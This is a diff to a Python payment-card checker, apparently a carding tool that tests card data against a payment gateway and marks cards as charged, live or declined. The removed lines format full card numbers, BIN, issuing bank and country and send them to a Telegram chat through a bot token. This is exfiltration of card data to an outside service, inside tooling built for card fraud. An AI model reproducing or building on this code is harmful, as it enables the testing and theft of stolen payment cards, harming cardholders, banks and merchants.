@@ -709,19 +709,6 @@ class AsyncCardChecker:
                     result['response_text'] = response_text
                     result['formatted_status'] = 'CVV'
 
-                    # Send to Telegram
-                    telegram_msg = f"""<b>PPCP-GATEWAY CHARGED</b>
-
-● <b>CC:</b> {self.cc_data}
-● <b>Price:</b> {price}
-● <b>Bin:</b> {self.cc6}
-● <b>Card Brand:</b> {bin_info['brand']}
-● <b>Card Type:</b> {bin_info['type']} - {bin_info['level']}
-● <b>Issuing Bank:</b> {bin_info['issuer']}
-● <b>Country:</b> {bin_info['country']}
-● <b>Receipt:</b> {receipt_url}"""
-
-                    await TelegramNotifier.send_message(telegram_msg, Config.TELEGRAM_TOKEN, Config.CHAT_ID)
                     return result
             except Exception as e:
                 logger.error(f"Error parsing success response: {e}")
@@ -758,22 +745,9 @@ class AsyncCardChecker:
 𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
-                    
+
                     result['response_text'] = response_text
                     result['formatted_status'] = 'CCN'
-
-                    # Send to Telegram for LIVE cards
-                    telegram_msg = f"""<b>PPCP-GATEWAY LIVE</b>
-
-● <b>CC:</b> {self.cc_data}
-● <b>Price:</b> {price}
-● <b>Bin:</b> {self.cc6}
-● <b>Card Brand:</b> {bin_info['brand']}
-● <b>Card Type:</b> {bin_info['type']} - {bin_info['level']}
-● <b>Issuing Bank:</b> {bin_info['issuer']}
-● <b>Country:</b> {bin_info['country']}"""
-
-                    await TelegramNotifier.send_message(telegram_msg, Config.TELEGRAM_TOKEN, Config.CHAT_ID)
                 else:
                     response_text = f"""DECLINED ❌
 
@@ -788,7 +762,7 @@ class AsyncCardChecker:
 𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
-                    
+
                     result['response_text'] = response_text
 
                 return result
